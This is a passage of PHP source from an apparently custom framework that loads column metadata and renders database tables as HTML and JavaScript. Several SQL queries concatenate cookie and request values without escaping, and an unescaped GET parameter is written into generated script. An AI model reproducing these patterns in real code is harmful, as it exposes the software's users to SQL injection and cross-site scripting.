         $tbcdtss=str_replace("[thissysid]",atv("(coode_sysdefault@syskey='service' and companyid='".$_COOKIE["cid"]."').keyval"),$tbcdtss);
		 $tbcdtss=str_replace("[now]",date("Y-m-d H:i:s"),$tbcdtss);
		 $tbcdtss=str_replace("[anymark]",date("YmdHis").getRandChar(6),$tbcdtss);
         $x=anyfulltblist($showf,"",$hdata,$fpss,$cmk,$tbnmm,$tbkiss,$tbcdtss,"imgx",$surll,$odcdt);
         return $x;
       }else{
          $tbcdtss=str_replace("[rids]",$_COOKIE["rids"],$tbcdtss);
		  $tbcdtss=str_replace("[uid]",$_COOKIE["uid"],$tbcdtss);
          $tbcdtss=str_replace("[cid]",$_COOKIE["cid"],$tbcdtss);
          $tbcdtss=str_replace("[thissysid]",atv("(coode_sysdefault@syskey='service' and companyid='".$_COOKIE["cid"]."').keyval"),$tbcdtss);
		  $tbcdtss=str_replace("[date]",date("Y-m-d"),$tbcdtss);
		  $tbcdtss=str_replace("[now]",date("Y-m-d H:i:s"),$tbcdtss);
		  $tbcdtss=str_replace("[anymark]",date("YmdHis").getRandChar(6),$tbcdtss);
          $x=anypagetblist($showf,"","",$fpss,$cmk,$tbnmm,$tbkiss,$wtokiss,$tbcdtss,"imgx",$surll,$page,$pagenum,$odcdt);
          return $x;
       };      
 }else{
 };//totrst
}//function
function thekeyfun($kbase=array(array()),$dbnm,$tbnm,$keys){
if ($tbnm!="SHORTID"){
  if (_get("datahost")==""){
    $conn=mysql_connect(gl(),glu(),glp());
  }else{
    $conn["host"]=_get("datahost");
  }
  if ($keys=="*"){
   $krest=selectedx($conn,glb(),"select COLUMN_NAME,COLUMN_TYPE,COLUMN_DEFAULT,classp,keytitle,keyexplain,acthtml,atnhtml,jsshowfun,jspostfun,sysshowfun,syspostfun,changeable,displayed,clstxt,bfist,aftist,bfupd,aftupd,bfdel,aftdel,dxtype,SQX,keyexplain,PRIME from coode_keydetailx where TABLE_SCHEMA='".$dbnm."' and TABLE_NAME='".$tbnm."' ","utf8","");
  }else{
   $krest=selectedx($conn,glb(),"select COLUMN_NAME,COLUMN_TYPE,COLUMN_DEFAULT,classp,keytitle,keyexplain,acthtml,atnhtml,jsshowfun,jspostfun,sysshowfun,syspostfun,changeable,displayed,clstxt,bfist,aftist,bfupd,aftupd,bfdel,aftdel,dxtype,SQX,keyexplain,PRIME from coode_keydetailx where TABLE_SCHEMA='".$dbnm."' and TABLE_NAME='".$tbnm."' and ',".$keys.",SNO,' like concat('%,',COLUMN_NAME,',%')","utf8","");
  };
  $stid="";
}else{
  $conn=mysql_connect(gl(),glu(),glp());
  if ($keys!=""){
    $krest=selectedx($conn,glb(),"select TABLE_NAME,COLUMN_NAME,COLUMN_TYPE,COLUMN_DEFAULT,classp,keytitle,keyexplain,acthtml,atnhtml,jsshowfun,jspostfun,sysshowfun,syspostfun,changeable,displayed,clstxt,bfist,aftist,bfupd,aftupd,bfdel,aftdel,dxtype,SQX,keyexplain,PRIME from coode_keydetaily where TABLE_SCHEMA='".$dbnm."' and shortid='".$keys."' order by SQX","utf8","");    
    $tbnm=anyvalue($krest,"TABLE_NAME",0);
    $stid=$keys;
  }else{
   $totkc=0;
  };
}
  $totkc=countresult($krest);
  $dd=$tbnm."kbase=new Array();\r\n";
  $dd=$dd.$tbnm."kbase[\"COLUMN\"]=new Array();\r\n";
 for ($c=0;$c<$totkc;$c++){
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"]=new Array();\r\n";
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TYPE"]=anyvalue($krest,"COLUMN_TYPE",$c);
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TYPE\"]=\"".anyvalue($krest,"COLUMN_TYPE",$c)."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TITLE"]=anyvalue($krest,"keytitle",$c);
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TITLE\"]=\"".anyvalue($krest,"keytitle",$c)."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_CLASSP"]=anyvalue($krest,"classp",$c);
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_CLASSP\"]=\"".anyvalue($krest,"classp",$c)."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_DEFAULT"]=tostring(anyvalue($krest,"COLUMN_DEFAULT",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_DEFAULT\"]=\"".str_replace("\"","\\\"",anyvalue($krest,"COLUMN_DEFAULT",$c))."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_ACTHTM"]=tostring(anyvalue($krest,"acthtml",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_ACTHTM\"]=\"".str_replace("\"","\\\"",anyvalue($krest,"acthtml",$c))."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_ATNHTM"]=tostring(anyvalue($krest,"atnhtml",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_ATNHTM\"]=\"".str_replace("\"","\\\"",anyvalue($krest,"atnhtml",$c))."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_JSHOW"]=tostring(anyvalue($krest,"jsshowfun",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_JSHOW\"]=\"".str_replace("\"","\\\"",anyvalue($krest,"jsshowfun",$c))."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_JPOST"]=tostring(anyvalue($krest,"jspostfun",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_JPOST\"]=\"".str_replace("\"","\\\"",anyvalue($krest,"jspostfun",$c))."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_SSHOW"]=tostring(anyvalue($krest,"sysshowfun",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_SSHOW\"]=\"".str_replace("\"","\\\"",anyvalue($krest,"sysshowfun",$c))."\";\r\n";    
    //echo tostring(anyvalue($krest,"sysshowfun",$c));//sdfsdf
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_SPOST"]=tostring(anyvalue($krest,"syspostfun",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_SPOST\"]=\"".anyvalue($krest,"syspostfun",$c)."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_CANGE"]=tostring(anyvalue($krest,"changeable",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_CANGE\"]=\"".anyvalue($krest,"changeable",$c)."\";\r\n";       
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_DSPLD"]=tostring(anyvalue($krest,"displayed",$c));   
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_DSPLD\"]=\"".anyvalue($krest,"displayed",$c)."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_DXTYPE"]=tostring(anyvalue($krest,"dxtype",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_DXTYPE\"]=\"".anyvalue($krest,"dxtype",$c)."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_SQX"]=tostring(anyvalue($krest,"SQX",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_SQX\"]=\"".anyvalue($krest,"SQX",$c)."\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_EXPLAIN"]=tostring(anyvalue($krest,"keyexplain",$c));
    $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_EXPLAIN\"]=\"".anyvalue($krest,"keyexplain",$c)."\";\r\n";    
   //echo "ccc-".$c."---".anyvalue($krest,"COLUMN_NAME",$c).tostring(anyvalue($krest,"dxtype",$c));
    $tmpxclstxt=anyvalue($krest,"clstxt",$c);
    if ((strpos($tmpxclstxt,"]")>0 or strpos($tmpxclstxt,"}")>0) and strpos($tmpxclstxt,"key")<=0 ){//key-为取表格行中值 则返回原代码
      $tmpxclstxt=str_replace("[","",$tmpxclstxt);
      $tmpxclstxt=str_replace("]","",$tmpxclstxt);
      $tmpxclstxt=str_replace("{","",$tmpxclstxt);
      $tmpxclstxt=str_replace("}","",$tmpxclstxt);
      $tmpxclstxt=str_replace(" ","",$tmpxclstxt);
      $newonex=$tmpxclstxt;
                      if (strpos($newonex,",")>0){
                       $ptnewo=explode(",",$newonex);
                       $totpn=count($ptnewo);
                       $fmmaq="";
                       $fmmah="";
                       for($zm=0;$zm<$totpn-1;$zm++){
                         $bknw=anyshort($ptnewo[$zm],"","");
                         $fmmaq=$fmmaq.qian($bknw,"|").",";
                         $fmmah=$fmmah.hou($bknw,"|").",";
                       }
                       $bknw=anyshort($ptnewo[$totpn-1],"","");
                       $fmmaq=$fmmaq.qian($bknw,"|");
                       $fmmah=$fmmah.hou($bknw,"|");
                       $newonex=$fmmaq."|".$fmmah;
                     }else{//发现有多个取值
                       $newonex=anyshort($newonex,"","");
                     }                    
     $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_CLSTXT"]=$newonex;
     $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_CLSTXT\"]=\"".$newonex."\";\r\n";    
      //echo $tmpxclstxt."---".anyshort($tmpxclstxt,"","");
    }else{
     $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_CLSTXT"]=anyvalue($krest,"clstxt",$c);
     $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_CLSTXT\"]=\"".$tmpxclstxt."\";\r\n";    
    }
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_BFIST"]=tostring(anyvalue($krest,"bfist",$c));
     $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_BFIST\"]=\"\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_AFTIST"]=tostring(anyvalue($krest,"aftist",$c));
     $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_AFTIST\"]=\"\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_BFUPD"]=tostring(anyvalue($krest,"bfupd",$c));
     $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_BFUPD\"]=\"\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_AFTUPD"]=tostring(anyvalue($krest,"aftupd",$c));
     $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_AFTUPD\"]=\"\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_BFDEL"]=tostring(anyvalue($krest,"bfdel",$c));
     $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_BFDEL\"]=\"\";\r\n";    
    $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_AFTDEL"]=tostring(anyvalue($krest,"aftdel",$c));
     $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_AFTDEL\"]=\"\";\r\n";    
    if (intval(anyvalue($krest,"PRIME",$c))==1){
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OBFIST"]=tostring(UX("select bfist as result from coode_keydetaily where COLUMN_NAME='".anyvalue($krest,"COLUMN_NAME",$c)."' and shortid='".$tbnm."'"));
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OAFTIST"]=tostring(UX("select aftist as result from coode_keydetaily where COLUMN_NAME='".anyvalue($krest,"COLUMN_NAME",$c)."' and shortid='".$tbnm."'"));
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OBFUPD"]=tostring(UX("select bfupd as result from coode_keydetaily where COLUMN_NAME='".anyvalue($krest,"COLUMN_NAME",$c)."' and shortid='".$tbnm."'"));
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OAFTUPD"]=tostring(UX("select aftupd as result from coode_keydetaily where COLUMN_NAME='".anyvalue($krest,"COLUMN_NAME",$c)."' and shortid='".$tbnm."'"));
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OBFDEL"]=tostring(UX("select bfdel as result from coode_keydetaily where COLUMN_NAME='".anyvalue($krest,"COLUMN_NAME",$c)."' and shortid='".$tbnm."'"));
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OAFTDEL"]=tostring(UX("select aftdel as result from coode_keydetaily where COLUMN_NAME='".anyvalue($krest,"COLUMN_NAME",$c)."' and shortid='".$tbnm."'"));
    }else{
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OBFIST"]="";
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OAFTIST"]="";
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OBFUPD"]="";
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OAFTUPD"]="";
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OBFDEL"]="";
      $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_OAFTDEL"]="";
    }
    $kbase["COLUMN"][$c]=anyvalue($krest,"COLUMN_NAME",$c);
     $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][".$c."]=\"".anyvalue($krest,"COLUMN_NAME",$c)."\";\r\n";    
      if (strpos(anyvalue($krest,"COLUMN_TYPE",$c),"(")>0){
       $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TPNM"]=qian(anyvalue($krest,"COLUMN_TYPE",$c),"(");
       $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TPNM\"]=\"".qian(anyvalue($krest,"COLUMN_TYPE",$c),"(")."\";\r\n";    
       $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TPLEN"]=qian(hou(anyvalue($krest,"COLUMN_TYPE",$c),"("),")");
       $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TPLEN\"]=\"".qian(hou(anyvalue($krest,"COLUMN_TYPE",$c),"("),")")."\";\r\n";    
        
        if ($kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TPLEN"]>=50 || $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_CLSTXT"]!="" || $kbase["COLUMN"][$c]=="SNO" ){
         if (strpos("x".$kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_CLSTXT"],"union-")<=0 && strpos("x".$kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_CLSTXT"],"TYPE_HEX")<=0){
          $fmfrm=$fmfrm."+".anyvalue($krest,"COLUMN_NAME",$c)."+";
         }else{
          $fmfrm=$fmfrm."*".anyvalue($krest,"COLUMN_NAME",$c); //最后++,*+合并成 +
         };
        }else{
         $fmfrm=$fmfrm."*".anyvalue($krest,"COLUMN_NAME",$c); //最后++,*+合并成 +
        };
      }else{
       $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TPNM"]=anyvalue($krest,"COLUMN_TYPE",$c);
        $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TPNM\"]=\"".anyvalue($krest,"COLUMN_TYPE",$c)."\";\r\n";    
       $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_TPLEN"]="0";
        $dd=$dd.$tbnm."kbase[\"".anyvalue($krest,"COLUMN_NAME",$c)."\"][\"COLUMN_TPLEN\"]=\"0\";\r\n";    
        if ( $kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_CLSTXT"]!="" ){
         if (strpos("x".$kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_CLSTXT"],"union-")<=0 && strpos("x".$kbase[anyvalue($krest,"COLUMN_NAME",$c)]["COLUMN_CLSTXT"],"TYPE_HEX")<=0){
          $fmfrm=$fmfrm."+".anyvalue($krest,"COLUMN_NAME",$c)."+";
         }else{
          $fmfrm=$fmfrm."*".anyvalue($krest,"COLUMN_NAME",$c); //最后++,*+合并成 +
         };
        }else{
         $fmfrm=$fmfrm."*".anyvalue($krest,"COLUMN_NAME",$c); //最后++,*+合并成 +
        };
      };
   
  // echo "kbase-".$kbase["COLUMN"][$c];
 };
  $fmfrm=$fmfrm."+";
  $fmfrm=str_replace("*+","+",$fmfrm);
  $fmfrm=str_replace("+*","+",$fmfrm);
  $fmfrm=str_replace("++","+",$fmfrm);
  $kbase["COLUMN"]["SEQUENCE"]=$fmfrm;
  $dd=$dd.$tbnm."kbase[\"COLUMN\"][\"SEQUENCE\"]=\"".$fmfrm."\";\r\n";    
  $kbase["COLUMN"]["COUNT"]=$totkc;
  $dd=$dd.$tbnm."kbase[\"COLUMN\"][\"COLUMN_TPLEN\"]=\"".$totkc."\";\r\n";    
  $kbase["COLUMN"]["READONLY"]=$_GET['readonly'];
  $dd=$dd.$tbnm."kbase[\"COLUMN\"][\"READONLY\"]=\"".$_GET['readonly']."\";\r\n";    
  $kbase["CODE"]["JS"]=$dd;
  $kbase["TABLE"]["NAME"]=$tbnm;
  $kbase["SHORT"]["NAME"]=$stid;
  return $kbase;
}

//接收的时候，判断字段是否有函数的描述了，如果有，则用函数创建值 再写一个 TD监听函数再主页面，自动加INPUT ('P_MKNM+SNOID',VALUE=)

function makekey($mkei){
 $partmk=explode(",",$mkei);
 $tot=count($partmk);
 $fmmk="";
 for ($i=0;$i<$tot;$i++){
   if (hou($partmk[$i],".")!="SNO" and strpos("--".$fmmk,hou($partmk[$i],"."))<=0){
    $fmmk=$fmmk.$partmk[$i].",";
   };
 };
 if ($tot>0){
  $fmmk=substr($fmmk,0,strlen($fmmk)-1);
 };
 return $fmmk;
}


function correctv($tpnx,$tplx,$prv){
if($tpnx!=""){
   if ($tpnx=="datetime" or $tpnx=="date"){  
	 if (strtotime($prv)!=""){
		 return $prv;
	 }else{
	     return date("Y-m-d");
	 };
  }else{
    if ($tpnx=="decimal"){
		if ($prv*1>0){
		 return $prv;
		}else{
		 return "0.00";
        };			
    }else{//如果字符串小于230 则都弄成varchar230
      if ($tpnx=="int"){
		  return $prv*1;
	  }else{
		  return $prv;
	  };
    };//if
   };//if
}else{
    if (strtotime($prv)!=""){ 
		 if (strpos($prv," ")>0){
		  return "datetime";
		 }else{
		  return "date";
		 };
    }else{
     if ($prv*1>0 or $prv=="0"){
       if (strpos($prv,".")>0){//如果有小数点则看看小数点长度
          $xsdcd=strlen(hou($prv,"."));
			  return "decimal(10,".$xsdcd.")";
        }else{
			  return "int(11)";
        };
     }else{//如果字符串小于230 则都弄成varchar230
       if (strlen($prv)<1030){
		  if ($tpnx=="varchar"){
			  return $prv;
		  }else{
			  return "varchar(1024)";
		  };                          
       }else{
      	  if ($tpnx=="text"){
			  return $prv;
		  }else{
			  return "text";
		  };                   	  
       };//1030
     };//ifprev*0
    };//if	//prev!=""strtime
  };//iftpnx  
}
function mkdisplay($mkx){
  if (intval($mkx)*1==1){
     return "";
  }else{
     return "style=\"display:none;\"";
  }
}
function mkrdol($mkx){
  if (intval($mkx)*1==1){
     return "readonly";
  }else{
     return "";
  }
}
function mkcange($mkx){
  if (intval($mkx)*1==1){
     return "";
  }else{
     return "readonly";
  }
}
function makeselectx($newonex){
  return "";
}
function maketbdata($totrst,$totk,$tbkis,$chtml,$oprtx,$obtn,$vbtn,$xbtn,$dtp,$headx,$appid,$tbnm,$sresult,$kpart,$keyinfo,$tbdatay=array(),$xid){    
  $fmjs="";
  $fmtb="";
  $fmch="";
  $fmexl="";
  $fmclsmd5="";
  $fmmd5js="";
  $fmmd5js="{";
  $fmline="";  
  $fmtbk=""; 
  for ($jj=1;$jj<$totrst+1;$jj++){
    $fmjs=$fmjs."{";    
    if ($dtp=="html" or $dtp=="table"){
     $fmtb=$fmtb."<tr id=\"".$xid.$sresult["SNO"][$jj]."\" rowidx=\"".($jj)."\" class=\"TABTR_CLS\" style=\"TABTR:STL\">";
    }    
    $tmp=0;
    $fmudt="";
    $demo=$chtml;        
    for ($ii=0;$ii<$totk;$ii++){
      $_GET["key".hou($kpart[$ii],".")]=$sresult[hou($kpart[$ii],".")][$jj];//所以这个GET 有顺序的，在SHORTCLS引用前 最好让他没顺序
    }
    for ($ii=0;$ii<$totk;$ii++){
      $tmpatn="";
      $tmpact="";
      if (strpos("x".$exkkk.",","-".hou($kpart[$ii],".").",")>0){
        $sresult[hou($kpart[$ii],".")][$jj]="***";
      };            
       $fmjs=$fmjs."\"".hou($kpart[$ii],".")."\":\"".str_replace("\"","\\\"",tohex($sresult[hou($kpart[$ii],".")][$jj]))."\",";
             $newonex=tostring($keyinfo[hou($kpart[$ii],".")]["COLUMN_CLSTXT"]);
                //echo "newonex-aaaa".$keyinfo[hou($kpart[$ii],".")]["COLUMN_CLSTXT"];
                
                 if (strpos($newonex,"key-")>0){
                   $hk=qian(hou($newonex,"key-"),"]");
                   $newonex=tostring($sresult[$hk][$jj]);
                 }else{
                   if (strpos($newonex,"key")>0 ){
                    $newonex=str_replace("[","",$newonex);
                    $newonex=str_replace("]","",$newonex);
                    $newonex=str_replace("{","",$newonex);
                    $newonex=str_replace("}","",$newonex);
                      if (strpos($newonex,",")>0){
                       $ptnewo=explode(",",$newonex);
                       $totpn=count($ptnewo);
                       $fmmaq="";
                       $fmmah="";
                       for($zm=0;$zm<$totpn-1;$zm++){
                         $bknw=anyshort($ptnewo[$zm],"","");
                         $fmmaq=$fmmaq.qian($bknw,"|").",";
                         $fmmah=$fmmah.hou($bknw,"|").",";
                       }
                       $bknw=anyshort($ptnewo[$totpn-1],"","");
                       $fmmaq=$fmmaq.qian($bknw,"|");
                       $fmmah=$fmmah.hou($bknw,"|");
                       $newonex=$fmmaq."|".$fmmah;                             
                     }else{//发现有多个取值
                       $newonex=anyshort($newonex,"","");
                     }                    
                     $fmjs=$fmjs."\"".hou($kpart[$ii],".")."clstxt\":\"a".md5($newonex)."\",";
                     if (strpos($fmclsmd5,md5($newonex))>0){
                     }else{
                       $fmclsmd5=$fmclsmd5."/".md5($newonex);
                       $fmmd5js=$fmmd5js."\"a".md5($newonex)."\":\"".tohex($newonex)."\",";
                     }
                   };
                 };
               if ($keyinfo[hou($kpart[$ii],".")]["COLUMN_CANGE"]*1==1){
                 $rdonly="";
               }else{
                 $rdonly="readonly";
               }
      if (hou($kpart[$ii],".")=='SNO'){
         if ($dtp=="html" or $dtp=="table"){
           $fmtb=$fmtb."<td id=\"SNO".$sresult['SNO'][$jj]."\" class=\"TABTD_CLS\"   ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])."><input type=\"checkbox\" id=\"chk".$sresult['SNO'][$jj]."\" name=\"chksno\"  lay-skin=\"primary\"  value=\"".$sresult['SNO'][$jj]."\">".$sresult['SNO'][$jj]."</td>\r\n";        
           if (intval(_get("SNO"))==intval($sresult['SNO'][$jj])){             
             $fmline=$fmline."<td id=\"SNO".$sresult['SNO'][$jj]."\" class=\"TABTD_CLS\"   ".mkdisplay($keyinfo[hou($kpart[$ii],".")]["COLUMN_DSPLD"])."><input type=\"checkbox\" id=\"chk".$sresult['SNO'][$jj]."\" name=\"chksno\"  lay-skin=\"primary\"  value=\"".$sresult['SNO'][$jj]."\">".$sresult['SNO'][$jj]."</td>\r\n";             
           };          
         }
         if ($dtp=="imgx"){
          $demo=str_replace("[SNO]",$sresult['SNO'][$jj],$demo);
          $demo=str_replace("[key-SNO]",$sresult['SNO'][$jj],$demo);
          $demo=str_replace("[thissno]",$sresult['SNO'][$jj],$demo);
         }
          $tmp=$tmp+1;
          if (intval($sresult[hou($kpart[$ii],".")][$jj])*1>=1000000000){
            $fmexl=$fmexl.$sresult[hou($kpart[$ii],".")][$jj]."_[tab]";
          }else{
            $fmexl=$fmexl.$sresult[hou($kpart[$ii],".")][$jj]."[tab]";
          };        
      }else{
        
           if (intval($sresult[hou($kpart[$ii],".")][$jj])*1>=1000000000){
            $fmexl=$fmexl.$sresult[hou($kpart[$ii],".")][$jj]."_[tab]";
           }else{
            $fmexl=$fmexl.$sresult[hou($kpart[$ii],".")][$jj]."[tab]";
           };
        if ($tmp>0){         
            $newonex=tostring($keyinfo[hou($kpart[$ii],".")]["COLUMN_CLSTXT"]);//这里不是多余的 如果下列判断无效就直接引用值          
          //echo "kpt".hou($kpart[$ii],".")."--".$newonex;
            $kclstxt=tostring($keyinfo[hou($kpart[$ii],".")]["COLUMN_CLSTXT"]);  
           if ($dtp=="html" or $dtp=="table" or $dtp=="imgx"){
             if (strlen($keyinfo[hou($kpart[$ii],".")]["COLUMN_ACTHTM"])>5){
               $tmpact=fmvalue($tbnm,$sresult[hou($kpart[$ii],".")][$jj],$sresult['SNO'][$jj],hou($kpart[$ii],"."),$keyinfo[hou($kpart[$ii],".")]["COLUMN_ACTHTM"],$jj,$sresult);
             }else{
               $tmpact="";
             };
             if (strlen($keyinfo[hou($kpart[$ii],".")]["COLUMN_ATNHTM"])>5){
              $tmpatn=fmvalue($tbnm,$sresult[hou($kpart[$ii],".")][$jj],$sresult['SNO'][$jj],hou($kpart[$ii],"."),$keyinfo[hou($kpart[$ii],".")]["COLUMN_ATNHTM"],$jj,$sresult);
             }else{
               $tmpatn="";
             };
             if (strlen($tmpatn)>5){
               $ckcd=$tmpatn;
             }else{
               //$ckcd=" onclick=\"qajaxp('修改记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=".hou($kpart[$ii],".")."&SNO=".$sresult['SNO'][$jj]."','p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."='+getduovalue('"."p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."'));\"";
             };
             if (strlen($tmpact)>5){
               $selecthcd=$tmpact;
             }else{
               if ($rdonly==""){
                //$selecthcd=" onchange=\"qajaxp('修改记录','/DNA/EXF/anyrcv.php?appid=".$appid."&tbnm=".$tbnm."&kies=".hou($kpart[$ii],".")."&SNO=".$sresult['SNO'][$jj]."','p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."='+$('#"."p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."').val())\"";
               }
             }
             if ($kclstxt!="" ){                
                 if (strpos($newonex,"key-")>0){
                   $hk=qian(hou($newonex,"key-"),"]");
                   $newonex=tostring($sresult[$hk][$jj]);
                 }else{
                   if (strpos($newonex,"key")>0 ){//对还有一种 [get-keysysid  这种模型 让字段值作为SHORT参数的需要计算
                    $newonex=str_replace("[","",$newonex);
                    $newonex=str_replace("]","",$newonex);
                    $newonex=str_replace("{","",$newonex);
                    $newonex=str_replace("}","",$newonex);
                      if (strpos($newonex,",")>0){
                       $ptnewo=explode(",",$newonex);
                       $totpn=count($ptnewo);
                       $fmmaq="";
                       $fmmah="";
                       for($zm=0;$zm<$totpn-1;$zm++){
                         $bknw=anyshort($ptnewo[$zm],"","");
                         $fmmaq=$fmmaq.qian($bknw,"|").",";
                         $fmmah=$fmmah.hou($bknw,"|").",";
                       }
                       $bknw=anyshort($ptnewo[$totpn-1],"","");
                       $fmmaq=$fmmaq.qian($bknw,"|");
                       $fmmah=$fmmah.hou($bknw,"|");
                       $newonex=$fmmaq."|".$fmmah;                             
                     }else{//发现有多个取值
                       $newonex=anyshort($newonex,"","");
                     }                                                            
                   };//在其他的情况就不用开率 上面已经声明了 如果有GETKEY的表格就不能用静态显示前端了
                  };                 
                 if ($keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]=="clstxt"){
                     $fmtmpselect=formselect(qian($newonex,"|"),hou($newonex,"|"),$sresult[hou($kpart[$ii],".")][$jj],"p_".hou($kpart[$ii],".").$sresult['SNO'][$jj],$rdonly,$selecthcd);                      
                 }                 
                 if ($keyinfo[hou($kpart[$ii],".")]["COLUMN_DXTYPE"]=="clsduo"){                               
                     $fmtmpselect="<input type=\"hidden\" id=\""."p_".hou($kpart[$ii],".").$sresult['SNO'][$jj]."\" value=\"".$sresult[hou($kpart[$ii],".")][$jj]."\">".formselectx(qian($newonex,"|"),hou($newonex,"|"),$sresult[hou($kpart[$ii],".")][$jj],"p_".hou($kpart[$ii],".").$sresult['SNO'][$jj],"","");
                 };       
               };//kclstxt
                $tmpvl="";
